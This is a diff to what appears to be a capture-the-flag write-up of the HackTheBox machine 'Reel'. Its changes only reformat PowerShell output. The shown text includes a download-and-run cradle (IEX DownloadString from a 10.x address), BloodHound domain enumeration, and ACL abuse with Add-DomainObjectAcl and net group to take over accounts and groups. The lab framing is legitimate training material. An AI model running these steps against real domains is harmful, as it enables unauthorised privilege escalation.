@@ -520,8 +520,14 @@ PS C:\Users\tom> IEX (New-Object System.Net.WebClient).DownloadString('http://10
 And now we can run the Invoke-BloodHound function to gather the needed data, but first we’ll need to move to a directory in which we can write without risk of overwriting anything or not having write permissions:
 
 {% highlight powershell %}
-PS C:\Users\tom> Invoke-BloodHound -CollectionMethod All                                          Initializing BloodHound at 3:20 AM on 8/19/2019                                                   Resolved Collection Methods to Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM                       
-Starting Enumeration for HTB.LOCAL                                                                Status: 84 objects enumerated (+84 Infinity/s --- Using 101 MB RAM )                              Finished enumeration for HTB.LOCAL in 00:00:00.4372083                                            0 hosts failed ping. 0 hosts timedout.                                                            
+PS C:\Users\tom> Invoke-BloodHound -CollectionMethod All
+Initializing BloodHound at 3:20 AM on 8/19/2019                                                   
+Resolved Collection 
+Methods to Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM
+Starting Enumeration for HTB.LOCAL
+Status: 84 objects enumerated (+84 Infinity/s --- Using 101 MB RAM )
+Finished enumeration for HTB.LOCAL in 00:00:00.4372083
+0 hosts failed ping. 0 hosts timedout.                                                            
 
 Compressing data to C:\Users\tom\20190819032010_BloodHound.zip.
 You can upload this file directly to the UI.   
@@ -635,9 +641,11 @@ Now that tom is the owner of the claire object, tom can add entries to the ACL. 
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
 VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL
 VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=tom)(name=tom)(displayname=tom))))
-VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL                                 VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=claire)(name=claire)(displayname=claire))))
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=claire)(name=claire)(displayname=claire))))
 VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL 'ResetPassword' on CN=Claire
-Danes,CN=Users,DC=HTB,DC=LOCAL                                                                    VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL rights GUID
+Danes,CN=Users,DC=HTB,DC=LOCAL
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL rights GUID 
 '00299570-246d-11d0-a768-00aa006e0529' on CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
 {% endhighlight %}  
 
@@ -672,11 +680,10 @@ From the analysis before, I know that claire has WriteDacl rights on the Backup_
 
 {% highlight powershell %}
 claire@REEL C:\Users\claire>net group backup_admins                        
-Group name     Backup_Admins
-Comment
-Members
--------------------------------------------------------------------------------
-ranj                
+Group name:     Backup_Admins
+Comment:
+Members:	ranj           
+-------------------------------------------------------------------------------     
 The command completed successfully.
 
 claire@REEL C:\Users\claire>net group backup_admins claire /add
